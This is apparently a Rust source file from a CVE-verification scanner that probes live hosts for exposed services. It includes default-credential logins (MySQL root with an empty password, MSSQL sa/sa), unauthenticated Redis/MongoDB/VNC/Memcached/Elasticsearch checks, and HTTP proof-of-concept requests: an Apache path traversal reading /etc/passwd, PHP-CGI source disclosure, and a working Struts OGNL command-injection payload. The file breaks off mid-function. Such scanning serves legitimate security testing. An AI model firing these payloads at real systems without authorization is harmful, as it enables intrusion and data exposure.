use std::collections::HashSet;
use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use anyhow::{Context, Result};
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::sync::Semaphore;

use crate::cve::{dotted_version_after, version_in_range};
use crate::dns_scan::resolve_first_ip;
use crate::shared::{build_default_resolver, DISPATCH_BATCH_SIZE};

mod probes;
use probes::{probe_for_technology, unreachable_at};
#[cfg(test)]
use probes::{parse_mssql_prelogin_version, parse_rfb_version};
use probes::{verify_docker, verify_proftpd, verify_vsftpd};

const CONNECT_TIMEOUT: Duration = Duration::from_secs(5);
const READ_TIMEOUT: Duration = Duration::from_secs(3);
const HTTP_TIMEOUT: Duration = Duration::from_secs(8);
const MAX_BODY: usize = 96 * 1024;

/// HTTP-detected technologies. These are verified with a real HTTP(S) request; they are
/// never confirmed by a bare TCP port-80 probe (that used to mark every live website as
/// "vulnerable" for every matched web-server/CMS CVE).
const HTTP_TECHS: &[&str] = &[
    "apache", "nginx", "tomcat", "iis", "litespeed", "php",
    "wordpress", "drupal", "joomla", "typo3", "exchange",
    "magento", "prestashop", "roundcube",
    "express", "craft cms", "laravel",
    "apache-struts", "apache-log4j", "apache-shiro",
];

pub(crate) fn is_http_tech(tech: &str) -> bool {
    HTTP_TECHS.contains(&tech)
}

/// Outcome of the `verified` column. Kept as small integers for the DB but named here so
/// the meaning is unambiguous. `Unverified` (0) is the schema default and is never written
/// by this module.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum VerifyStatus {
    Confirmed = 1,
    Refuted = 2,
    Unreachable = 3,
    Exploited = 4,
}

impl VerifyStatus {
    fn as_i32(self) -> i32 {
        self as i32
    }
}

/// What a single live probe learned about a service. Kept separate from the per-CVE
/// verdict so one probe can be evaluated against many CVEs (each with its own version
/// range) without re-hitting the host.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum ProbeOutcome {
    /// Could not connect / resolve.
    Unreachable { method: String, proof: String },
    /// Connected, but the service is not the expected technology.
    WrongService { method: String, proof: String },
    /// Service is present; `version` is the live version if one could be read.
    Present { method: String, version: Option<String>, proof: String },
    /// An active check directly demonstrated the vulnerable behaviour (e.g. an
    /// unauthenticated Docker API, or a triggered backdoor). Version is irrelevant.
    Behavior { method: String, proof: String },
}

/// Turn a single probe outcome into a per-CVE verdict, using that CVE's affected range.
/// A live version can only ever *refute* a match; it is never invented. Presence-only
/// probes (no readable version) confirm, since matching already required the fingerprint.
pub(crate) fn evaluate(
    outcome: &ProbeOutcome,
    affected_from: Option<&str>,
    affected_to: Option<&str>,
) -> (VerifyStatus, String, String) {
    match outcome {
        ProbeOutcome::Unreachable { method, proof } => {
            (VerifyStatus::Unreachable, method.clone(), proof.clone())
        }
        ProbeOutcome::WrongService { method, proof } => {
            (VerifyStatus::Refuted, method.clone(), proof.clone())
        }
        ProbeOutcome::Behavior { method, proof } => {
            (VerifyStatus::Exploited, method.clone(), proof.clone())
        }
        ProbeOutcome::Present { method, version, proof } => match version {
            Some(v) => {
                if version_in_range(v, affected_from, affected_to) {
                    (
                        VerifyStatus::Confirmed,
                        method.clone(),
                        format!("{proof}; live version {v} within affected range"),
                    )
                } else {
                    (
                        VerifyStatus::Refuted,
                        method.clone(),
                        format!("{proof}; live version {v} outside affected range"),
                    )
                }
            }
            None => (VerifyStatus::Confirmed, method.clone(), proof.clone()),
        },
    }
}

#[derive(Debug, Clone)]
struct VerificationTask {
    domain: String,
    cve_id: String,
    technology: String,
    #[allow(dead_code)]
    version: Option<String>,
    ip: Option<String>,
    port: u16,
    affected_from: Option<String>,
    affected_to: Option<String>,
}

#[derive(Debug)]
struct VerificationResult {
    domain: String,
    cve_id: String,
    verified: i32,
    check_method: String,
    proof: Option<String>,
}

// ---- Low-level I/O helpers ----

async fn probe_port(ip: IpAddr, port: u16) -> Option<TcpStream> {
    let addr = SocketAddr::new(ip, port);
    tokio::time::timeout(CONNECT_TIMEOUT, TcpStream::connect(addr))
        .await
        .ok()?
        .ok()
}

async fn read_line(stream: &mut TcpStream) -> Option<String> {
    use tokio::io::AsyncBufReadExt;
    tokio::time::timeout(READ_TIMEOUT, async {
        let mut reader = BufReader::new(stream);
        let mut buf = String::new();
        reader.read_line(&mut buf).await.ok()?;
        Some(buf.trim_end_matches(['\r', '\n']).to_string())
    })
    .await
    .ok()?
}

async fn read_chunk_bytes(stream: &mut TcpStream, max: usize) -> Option<Vec<u8>> {
    tokio::time::timeout(READ_TIMEOUT, async {
        let mut reader = BufReader::new(stream);
        let mut buf = vec![0u8; max];
        let n = reader.read(&mut buf).await.ok()?;
        if n == 0 {
            return None;
        }
        buf.truncate(n);
        Some(buf)
    })
    .await
    .ok()?
}

async fn read_chunk_printable(stream: &mut TcpStream, max: usize) -> Option<String> {
    let bytes = read_chunk_bytes(stream, max).await?;
    Some(to_printable(&bytes))
}

/// Truncate a string to at most `max` bytes without splitting a UTF-8 character.
/// (Slicing a `String` at a raw byte index panics when it lands mid-codepoint — pages with
/// multi-byte content like CJK or en-dashes routinely hit this.)
pub(crate) fn truncate_on_char_boundary(s: &str, max: usize) -> &str {
    if s.len() <= max {
        return s;
    }
    let mut end = max;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

fn to_printable(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|&b| {
            if b.is_ascii_graphic() || b == b' ' || b == b'\n' || b == b'\r' {
                b as char
            } else {
                '.'
            }
        })
        .collect()
}

// ---- Port fan-out helpers ----

fn technology_port(technology: &str) -> Option<u16> {
    match technology {
        "mysql" | "mariadb" => Some(3306),
        "mssql" => Some(1433),
        "openssh" => Some(22),
        "vsftpd" => Some(21),
        "proftpd" => Some(21),
        "redis" => Some(6379),
        "memcached" => Some(11211),
        "elasticsearch" => Some(9200),
        "docker" => Some(2375),
        "rdp" => Some(3389),
        "mongodb" => Some(27017),
        "postgresql" => Some(5432),
        "vnc" => Some(5900),
        "tomcat" => Some(8080),
        _ => None,
    }
}

// ---- Active exploit probes (return Behavior if exploitation succeeds) ----

async fn exploit_mysql(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let mut buf = [0u8; 1024];
    let n = stream.read(&mut buf).await.unwrap_or(0);
    if n < 4 {
        return ProbeOutcome::WrongService { method: "mysql_exploit".into(), proof: "no MySQL handshake".into() };
    }
    let handshake = &buf[..n];
    // MySQL handshake: protocol version at [0], server version at [1..], salt₁ at [8..15] (8 bytes)
    let proto_ver = handshake[0];
    if proto_ver != 10 {
        return ProbeOutcome::WrongService { method: "mysql_exploit".into(), proof: format!("not MySQL (proto {})", proto_ver) };
    }
    // We authenticate as root with an empty password, so the auth response is zero-length and
    // the handshake salt is never consumed (no scrambled-password path is implemented).
    // Build auth response for root with empty password
    let username = b"root\0"; // null-terminated
    let auth_resp_len = 0u8; // empty password → zero-length auth response
    let client_caps: u32 = 0x0001 | 0x0200 | 0x0800 | 0x8000; // CLIENT_LONG_PASSWORD | CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION | CLIENT_PLUGIN_AUTH
    let charset = 255u8; // utf8_general_ci
    // Build packet header: 3-byte length + 1-byte sequence
    let payload_len = 4 + 4 + 1 + 23 + username.len() + 1 + 1;
    let mut pkt = Vec::with_capacity(4 + payload_len);
    pkt.extend_from_slice(&(payload_len as u32).to_le_bytes()[..3]); // 3-byte length
    pkt.push(1u8); // sequence number = 1
    // Client capabilities (4 bytes)
    pkt.extend_from_slice(&client_caps.to_le_bytes());
    // Max packet size (4 bytes)
    pkt.extend_from_slice(&(16777215u32).to_le_bytes());
    // Charset (1 byte)
    pkt.push(charset);
    // Reserved (23 bytes of zeros)
    pkt.extend_from_slice(&[0u8; 23]);
    // Username (null-terminated)
    pkt.extend_from_slice(username);
    // Auth response length + data (empty password → 0x00)
    pkt.push(auth_resp_len);
    // No database, no plugin name for now
    let _ = stream.write_all(&pkt).await;
    let mut resp = [0u8; 1024];
    let rn = stream.read(&mut resp).await.unwrap_or(0);
    if rn < 4 {
        return ProbeOutcome::Present {
            method: "mysql_exploit".into(),
            version: None,
            proof: "MySQL responded but no auth result received".into(),
        };
    }
    // MySQL OK packet starts with 0x00, ERR with 0xFF
    let pkt_type = resp[4]; // skip 4-byte header
    if pkt_type == 0x00 {
        ProbeOutcome::Behavior {
            method: "mysql_exploit".into(),
            proof: format!("MySQL authenticated as root with empty password ({}:{})", ip, port),
        }
    } else if pkt_type == 0xFF {
        // Extract error message from ERR packet
        let err_msg = std::str::from_utf8(&resp[9..rn.min(140)]).unwrap_or("unknown error");
        ProbeOutcome::Present {
            method: "mysql_exploit".into(),
            version: None,
            proof: format!("MySQL root auth denied: {}", err_msg),
        }
    } else {
        ProbeOutcome::Present {
            method: "mysql_exploit".into(),
            version: None,
            proof: format!("MySQL unexpected response type {:#04x}", pkt_type),
        }
    }
}

async fn exploit_redis(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let ping = b"PING\r\n";
    let _ = stream.write_all(ping).await;
    let resp = read_chunk_printable(&mut stream, 256).await.unwrap_or_default();
    if resp.contains("+PONG") || resp.contains("+OK") {
        ProbeOutcome::Behavior {
            method: "redis_exploit".into(),
            proof: format!("Redis acessível sem autenticação em {}:{}", ip, port),
        }
    } else if resp.contains("-NOAUTH") {
        ProbeOutcome::Present {
            method: "redis_exploit".into(),
            version: None,
            proof: format!("Redis requer autenticação em {}:{}", ip, port),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "redis_exploit".into(),
            proof: format!("resposta inesperada: {:.64}", resp),
        }
    }
}

async fn exploit_mongodb(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // MongoDB handshake: send isMaster command
    let is_master = b"\x3a\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x0b\x00\x00\x00\x01isMaster\x00\x00\x00\x00\x00\x00\xf0\x3f\x00";
    let _ = stream.write_all(is_master).await;
    let resp = read_chunk_printable(&mut stream, 1024).await.unwrap_or_default();
    if resp.contains("ismaster") || resp.contains("ok") {
        ProbeOutcome::Behavior {
            method: "mongo_exploit".into(),
            proof: format!("MongoDB acessível sem autenticação em {}:{}", ip, port),
        }
    } else if resp.contains("unauthorized") || resp.contains("Authentication") {
        ProbeOutcome::Present {
            method: "mongo_exploit".into(),
            version: None,
            proof: format!("MongoDB requer autenticação: {:.64}", resp),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "mongo_exploit".into(),
            proof: format!("resposta inesperada: {:.64}", resp),
        }
    }
}

async fn exploit_vnc(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let mut buf = [0u8; 1024];
    let n = stream.read(&mut buf).await.unwrap_or(0);
    if n < 12 {
        return ProbeOutcome::WrongService { method: "vnc_exploit".into(), proof: "handshake curto".into() };
    }
    // RFB protocol: first byte is version 'R'
    if buf[0] != b'R' {
        return ProbeOutcome::WrongService { method: "vnc_exploit".into(), proof: "não é RFB".into() };
    }
    let version = std::str::from_utf8(&buf[..n.min(12)]).unwrap_or("?").to_string();
    // Send back the same version
    let _ = stream.write_all(&buf[..n.min(12)]).await;
    let n2 = stream.read(&mut buf).await.unwrap_or(0);
    // If VNC responded without requesting auth (security type 1 = None), it's exploitable
    if n2 >= 4 && buf[0] == 0x01 {
        ProbeOutcome::Behavior {
            method: "vnc_exploit".into(),
            proof: format!("VNC sem autenticação (security type None): {}:{}", ip, port),
        }
    } else {
        // Present but auth required - confirm it's VNC
        ProbeOutcome::Present {
            method: "vnc_exploit".into(),
            version: None,
            proof: format!("VNC detectado ({:?}), requer autenticação", version),
        }
    }
}

async fn exploit_memcached(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let stats = b"stats\r\n";
    let _ = stream.write_all(stats).await;
    let resp = read_chunk_printable(&mut stream, 2048).await.unwrap_or_default();
    if resp.contains("STAT") || resp.contains("uptime") || resp.contains("curr_items") {
        ProbeOutcome::Behavior {
            method: "memcached_exploit".into(),
            proof: format!("Memcached acessível sem autenticação em {}:{} — {} stats retornados", ip, port, resp.lines().count()),
        }
    } else if resp.contains("ERROR") {
        ProbeOutcome::Present {
            method: "memcached_exploit".into(),
            version: None,
            proof: "Memcached conectado mas stats negado".into(),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "memcached_exploit".into(),
            proof: format!("resposta inesperada: {:.64}", resp),
        }
    }
}

async fn exploit_mssql(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    // TDS pre-login
    let prelogin = b"\x12\x01\x00\x2f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x28\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00";
    let _ = stream.write_all(prelogin).await;
    let mut buf = [0u8; 2048];
    let n = stream.read(&mut buf).await.unwrap_or(0);
    if n == 0 || (buf[0] != 0x12 && buf[0] != 0x04) {
        return ProbeOutcome::Present {
            method: "mssql_exploit".into(),
            version: None,
            proof: format!("MSSQL connected but unexpected response: {:.64}", std::str::from_utf8(&buf[..n.min(32)]).unwrap_or("?")),
        };
    }
    // Build TDS LOGIN7 packet for sa/sa.
    // LOGIN7 header (36 bytes) followed by variable-length fields.
    let username = b"sa";
    let password = b"sa";
    let hostname = b"helvetiscan";
    let appname = b"helvetiscan";
    let srvname = b"";
    let libname = b"";
    let locale = b"";
    let database = b"";
    // Compute offsets: header is 36 bytes, fields are stored at offsets from the start.
    // Each field has a 4-byte offset + 2-byte length in the LOGIN7 header.
    let mut off = 36i32;
    let mut next = |field: &[u8], fields: &mut Vec<(i32, u16)>| -> i32 {
        let start = off;
        fields.push((start, field.len() as u16));
        off += field.len() as i32;
        start
    };
    let mut fields = Vec::new();
    let _hostname_off = next(hostname, &mut fields);
    let _username_off = next(username, &mut fields);
    let _password_off = next(password, &mut fields);
    let _appname_off = next(appname, &mut fields);
    let _srvname_off = next(srvname, &mut fields);
    let _libname_off = next(libname, &mut fields);
    let _locale_off = next(locale, &mut fields);
    let _database_off = next(database, &mut fields);

    let total_len = off as u32;
    // Build the LOGIN7 packet (simplified TDS 7.4):
    // TDS header: type(0x10=LOGIN7)+status(0x01=EOM)+length(2)+channel(2)+packet(1)+window(1)
    let mut pkt = Vec::with_capacity(8 + total_len as usize);
    pkt.push(0x10); // type LOGIN7
    pkt.push(0x01); // status EOM
    pkt.extend_from_slice(&(total_len as u16 + 8).to_be_bytes()); // total length
    pkt.extend_from_slice(&[0x00, 0x00]); // channel
    pkt.push(0x00); // packet
    pkt.push(0x00); // window

    // LOGIN7 body
    // TDS version (7.4 = 0x20140000)
    pkt.extend_from_slice(&0x20140000u32.to_le_bytes());
    // packet size: 4096
    pkt.extend_from_slice(&4096u32.to_le_bytes());
    // client prog version
    pkt.extend_from_slice(&[0x00; 4]);
    // client pid
    pkt.extend_from_slice(&12345u32.to_le_bytes());
    // connection id
    pkt.extend_from_slice(&[0x00; 4]);
    // option flags 1 (8 bytes)
    pkt.extend_from_slice(&[0xe0; 8]); // enable all default flags
    // status flags (8 bytes)
    pkt.extend_from_slice(&[0x00; 8]);
    // client timezone
    pkt.extend_from_slice(&0i16.to_le_bytes());
    // client LCID
    pkt.extend_from_slice(&[0x00; 4]);
    // hostname offset+length
    pkt.extend_from_slice(&fields[0].0.to_le_bytes()); // offset
    pkt.extend_from_slice(&fields[0].1.to_le_bytes()); // length
    // username offset+length
    pkt.extend_from_slice(&fields[1].0.to_le_bytes());
    pkt.extend_from_slice(&fields[1].1.to_le_bytes());
    // password offset+length
    pkt.extend_from_slice(&fields[2].0.to_le_bytes());
    pkt.extend_from_slice(&fields[2].1.to_le_bytes());
    // app name offset+length
    pkt.extend_from_slice(&fields[3].0.to_le_bytes());
    pkt.extend_from_slice(&fields[3].1.to_le_bytes());
    // server name offset+length
    pkt.extend_from_slice(&fields[4].0.to_le_bytes());
    pkt.extend_from_slice(&fields[4].1.to_le_bytes());
    // reserved (padding to reach field 16)
    pkt.resize(pkt.len() + 56, 0u8);
    // library name offset+length (field 14 in LOGIN7)
    pkt.extend_from_slice(&fields[5].0.to_le_bytes());
    pkt.extend_from_slice(&fields[5].1.to_le_bytes());
    // locale offset+length (field 15)
    pkt.extend_from_slice(&fields[6].0.to_le_bytes());
    pkt.extend_from_slice(&fields[6].1.to_le_bytes());
    // database offset+length (field 16)
    pkt.extend_from_slice(&fields[7].0.to_le_bytes());
    pkt.extend_from_slice(&fields[7].1.to_le_bytes());
    // client MAC address (6 bytes)
    pkt.extend_from_slice(&[0x00; 6]);
    // auth data offset (4) + length (4)
    pkt.extend_from_slice(&[0; 8]);
    // Change password offset + length (8 bytes)
    pkt.extend_from_slice(&[0; 8]);
    // Reserved (padding to header->data boundary)
    while pkt.len() < 8 + 36 {
        pkt.push(0u8);
    }
    // Variable-length data
    pkt.extend_from_slice(hostname);
    pkt.extend_from_slice(username);
    pkt.extend_from_slice(password);
    pkt.extend_from_slice(appname);
    pkt.extend_from_slice(srvname);
    pkt.extend_from_slice(libname);
    pkt.extend_from_slice(locale);
    pkt.extend_from_slice(database);

    // Update total length in TDS header
    let total_pkt_len = pkt.len() as u16;
    pkt[2..4].copy_from_slice(&total_pkt_len.to_be_bytes());

    let _ = stream.write_all(&pkt).await;
    let login_resp = read_chunk_bytes(&mut stream, 4096).await.unwrap_or_default();
    // TDS LOGIN7 response: type 0x04 (TABULAR) or 0x12 (LOGINACK)
    if login_resp.first() == Some(&0x04) || login_resp.first() == Some(&0x12) {
        let printable = to_printable(&login_resp);
        // LOGINACK: if login succeeded we see token 0xAD (LOGINACK) with status=0
        // If it failed we see token 0xAB (ERROR) or 0xAE (LOGINFAIL)
        if login_resp.contains(&0xAD) {
            ProbeOutcome::Behavior {
                method: "mssql_sa_exploit".into(),
                proof: format!("MSSQL sa/sa login successful on {}:{}", ip, port),
            }
        } else if printable.contains("login failed") || printable.contains("error") {
            ProbeOutcome::Present {
                method: "mssql_sa_exploit".into(),
                version: None,
                proof: format!("MSSQL sa/sa login denied: {:.128}", printable),
            }
        } else {
            ProbeOutcome::Present {
                method: "mssql_sa_exploit".into(),
                version: None,
                proof: format!("MSSQL connected, login status unknown: {:.128}", printable),
            }
        }
    } else {
        ProbeOutcome::Present {
            method: "mssql_sa_exploit".into(),
            version: None,
            proof: "MSSQL connected, no TDS login response".to_string(),
        }
    }
}

async fn exploit_elasticsearch(ip: IpAddr, port: u16) -> ProbeOutcome {
    let mut stream = match probe_port(ip, port).await {
        Some(s) => s,
        None => return unreachable_at(port),
    };
    let req = format!("GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n");
    let _ = stream.write_all(req.as_bytes()).await;
    let resp = read_chunk_printable(&mut stream, 4096).await.unwrap_or_default();
    let lower = resp.to_ascii_lowercase();
    if lower.contains("cluster_name") || lower.contains("tagline") || lower.contains("you know, for search") {
        ProbeOutcome::Behavior {
            method: "es_exploit".into(),
            proof: format!("Elasticsearch acessível sem autenticação em {}:{}", ip, port),
        }
    } else if lower.contains("elasticsearch") {
        ProbeOutcome::Present {
            method: "es_exploit".into(),
            version: None,
            proof: format!("Elasticsearch detectado: {:.128}", resp),
        }
    } else {
        ProbeOutcome::WrongService {
            method: "es_exploit".into(),
            proof: format!("não é Elasticsearch: {:.64}", resp),
        }
    }
}

// ---- HTTP verification (real request, never a bare port-80 probe) ----

/// Pure fingerprint decision from an HTTP response. `headers_blob` is a newline-joined
/// `name: value` string of the relevant response headers; `body` is a bounded prefix of
/// the response body. Returns `WrongService` when the technology is not actually observed —
/// this is what makes verify-cves *refuse* to confirm HTTP CVEs without a real check.
pub(crate) fn http_fingerprint(technology: &str, headers_blob: &str, body: &str) -> ProbeOutcome {
    let h = headers_blob.to_ascii_lowercase();
    let b = body.to_ascii_lowercase();

    let server_present = |needle: &str, tech: &str| -> ProbeOutcome {
        ProbeOutcome::Present {
            method: "http_server_header".into(),
            version: crate::cve::extract_http_version(headers_blob, tech),
            proof: format!("{needle} observed in HTTP headers"),
        }
    };
    let wrong = |proof: String| ProbeOutcome::WrongService { method: "http_probe".into(), proof };
    let body_present = |version: Option<String>, detail: &str| ProbeOutcome::Present {
        method: "http_body_fingerprint".into(),
        version,
        proof: detail.to_string(),
    };

    match technology {
        "apache" => {
            if h.contains("apache") { server_present("Apache", "apache") }
            else { wrong(format!("no Apache in headers: {:.96}", headers_blob)) }
        }
        "nginx" => {
            if h.contains("nginx") { server_present("nginx", "nginx") }
            else { wrong(format!("no nginx in headers: {:.96}", headers_blob)) }
        }
        "iis" => {
            if h.contains("microsoft-iis") { server_present("Microsoft-IIS", "iis") }
            else { wrong(format!("no IIS in headers: {:.96}", headers_blob)) }
        }
        "litespeed" => {
            if h.contains("litespeed") { server_present("LiteSpeed", "litespeed") }
            else { wrong(format!("no LiteSpeed in headers: {:.96}", headers_blob)) }
        }
        "tomcat" => {
            if h.contains("coyote") || h.contains("tomcat") {
                body_present(crate::cve::extract_http_version(headers_blob, "tomcat"), "Tomcat/Coyote observed in HTTP headers")
            } else { wrong(format!("no Tomcat in headers: {:.96}", headers_blob)) }
        }
        "php" => {
            if h.contains("php") { server_present("PHP", "php") }
            else if b.contains("phpsessid") { body_present(None, "PHPSESSID cookie/body marker observed") }
            else { wrong(format!("no PHP marker: {:.96}", headers_blob)) }
        }
        "wordpress" => {
            if b.contains("wp-content") || b.contains("wp-includes") || b.contains("wp-json") || h.contains("wordpress") {
                body_present(dotted_version_after(body, "wordpress "), "WordPress markers observed in page")
            } else { wrong("no WordPress markers in page".into()) }
        }
        "drupal" => {
            if h.contains("drupal") || b.contains("drupal.settings") || b.contains("/sites/default/") || b.contains("/sites/all/") {
                body_present(dotted_version_after(headers_blob, "drupal ").or_else(|| dotted_version_after(body, "drupal ")), "Drupal markers observed")
            } else { wrong("no Drupal markers".into()) }
        }
        "joomla" => {
            if b.contains("/media/jui/") || b.contains("com_content") || b.contains("joomla") {
                body_present(dotted_version_after(body, "joomla! "), "Joomla markers observed in page")
            } else { wrong("no Joomla markers".into()) }
        }
        "typo3" => {
            if b.contains("/typo3conf/") || b.contains("/typo3temp/") || b.contains("typo3") {
                body_present(None, "TYPO3 markers observed in page")
            } else { wrong("no TYPO3 markers".into()) }
        }
        "magento" => {
            if b.contains("/static/version") || b.contains("/skin/frontend/") || b.contains("mage-cache") || b.contains("magento") {
                body_present(None, "Magento markers observed in page")
            } else { wrong("no Magento markers".into()) }
        }
        "prestashop" => {
            if b.contains("prestashop") {
                body_present(None, "PrestaShop markers observed in page")
            } else { wrong("no PrestaShop markers".into()) }
        }
        "roundcube" => {
            if h.contains("roundcube") || b.contains("roundcube") || b.contains("rcmail") {
                body_present(None, "Roundcube markers observed")
            } else { wrong("no Roundcube markers".into()) }
        }
        "express" => {
            if h.contains("express") {
                server_present("Express", "express")
            } else { wrong(format!("no Express in headers: {:.96}", headers_blob)) }
        }
        "craft cms" => {
            if h.contains("craft") || b.contains("craftcms") || b.contains("craft-cms") || b.contains("/craft/") || b.contains("x-powered-by: craft") {
                body_present(None, "Craft CMS markers observed in page")
            } else { wrong("no Craft CMS markers".into()) }
        }
        "laravel" => {
            if h.contains("laravel") || b.contains("laravel") || b.contains("livewire") || b.contains("x-livewire") {
                body_present(dotted_version_after(body, "laravel ").or_else(|| dotted_version_after(headers_blob, "laravel ")), "Laravel markers observed")
            } else { wrong("no Laravel markers".into()) }
        }
        "exchange" => {
            if h.contains("x-owa-version") || h.contains("owa") || b.contains("outlook web app") || b.contains("/owa/auth") {
                body_present(dotted_version_after(headers_blob, "x-owa-version:"), "Exchange/OWA markers observed")
            } else { wrong("no Exchange/OWA markers".into()) }
        }
        "apache-struts" => {
            if b.contains("struts") || b.contains("ognl") || b.contains("ognl.exception") || b.contains("struts2") || b.contains("actionerror") {
                body_present(None, "Apache Struts markers observed (OGNL errors or .action/.do patterns)")
            } else { wrong("no Struts markers".into()) }
        }
        "apache-log4j" => {
            if b.contains("log4j") || b.contains("jndi") || h.contains("log4j") {
                body_present(None, "Log4j markers observed in page/headers")
            } else { wrong("no Log4j markers".into()) }
        }
        "apache-shiro" => {
            if h.contains("rememberme=deleteme") || b.contains("shiro") || h.contains("shiro") {
                body_present(None, "Apache Shiro markers observed (rememberMe cookie or body markers)")
            } else { wrong("no Shiro markers".into()) }
        }
        _ => wrong(format!("unhandled http technology: {technology}")),
    }
}

async fn fetch_and_fingerprint(client: &reqwest::Client, url: &str, technology: &str) -> Option<ProbeOutcome> {
    let resp = client.get(url).send().await.ok()?;
    let header = |name: &str| -> String {
        resp.headers()
            .get(name)
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string()
    };
    let headers_blob = format!(
        "server: {}\nx-powered-by: {}\nx-generator: {}\nx-owa-version: {}\nx-drupal-cache: {}\nset-cookie: {}",
        header("server"),
        header("x-powered-by"),
        header("x-generator"),
        header("x-owa-version"),
        header("x-drupal-cache"),
        header("set-cookie"),
    );
    let body = resp.text().await.unwrap_or_default();
    let body = truncate_on_char_boundary(&body, MAX_BODY);
    Some(http_fingerprint(technology, headers_blob.as_str(), body))
}

/// Safe, read-only active PoC checks. Returns `Some(Behavior)` only when an exploit
/// signature is directly observed in the response. Gated by `--aggressive` because it sends
/// attack-shaped (but non-destructive) requests. This is what turns "exposed" into "proven
/// exploitable" for the high-value pre-auth RCEs.
async fn active_http_poc(client: &reqwest::Client, domain: &str, technology: &str) -> Option<ProbeOutcome> {
    for scheme in ["https", "http"] {
        if matches!(technology, "apache" | "nginx" | "tomcat" | "litespeed") {
            let url = format!("{scheme}://{domain}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd");
            if let Ok(resp) = client.get(&url).send().await {
                if let Ok(body) = resp.text().await {
                    if is_etc_passwd(&body) {
                        return Some(ProbeOutcome::Behavior {
                            method: "apache_traversal_poc".into(),
                            proof: "CVE-2021-41773 path traversal confirmed: /etc/passwd disclosed".into(),
                        });
                    }
                }
            }
        }
        if technology == "php" {
            let url = format!("{scheme}://{domain}/index.php?-s");
            if let Ok(resp) = client.get(&url).send().await {
                if let Ok(body) = resp.text().await {
                    if is_php_source_leak(&body) {
                        return Some(ProbeOutcome::Behavior {
                            method: "php_cgi_source_poc".into(),
                            proof: "PHP-CGI argument injection (CVE-2012-1823/2024-4577): source disclosed via ?-s".into(),
                        });
                    }
                }
            }
        }
        // Apache Struts OGNL injection (CVE-2017-5638): send OGNL payload in Content-Type header
        // that executes `id` and adds output as a response header.
        if matches!(technology, "apache-struts") {
            let ognl_payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))).(#cmd='echo HELVETISCAN_STRUTS_RCE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
            let url = format!("{scheme}://{domain}/");
            if let Ok(resp) = client.get(&url).header("Content-Type", ognl_payload).send().await {
                let body = resp.text().await.unwrap_or_default();
                if body.contains("HELVETISCAN_STRUTS_RCE") {
                    return Some(ProbeOutcome::Behavior {
                        method: "struts_ognl_probe".into(),
                        proof: format!("CVE-2017-5638 OGNL injection confirmed: command output in response body ({:.200})", body.trim()),
                    });
                }
            }
            // Timing-based fallback: send OGNL payload with `sleep 5` to confirm blind injection
            let sleep_payload = ognl_payload.replace("echo HELVETISCAN_STRUTS_RCE", "sleep 5");
            let start = std::time::Instant::now();
            if let Ok(resp) = client.get(&url).header("Content-Type", &sleep_payload).send().await {
                let elapsed = start.elapsed().as_secs_f64();
                if elapsed >= 4.5 {
                    return Some(ProbeOutcome::Behavior {
                        method: "struts_ognl_timing".into(),
                        proof: format!("CVE-2017-5638 blind OGNL injection confirmed via `sleep 5`: response took {elapsed:.1}s"),
                    });
                }
                let _ = resp;
            }
        }
    }
    None
}

/// True if a response body looks like a real /etc/passwd (a root uid:0 line), not an error page.
pub(crate) fn is_etc_passwd(body: &str) -> bool {
    body.lines().any(|l| l.starts_with("root:") && l.contains(":0:0:"))
}

/// True if a body is the PHP-CGI `?-s` source-highlight output (colored `<?php` spans).
pub(crate) fn is_php_source_leak(body: &str) -> bool {
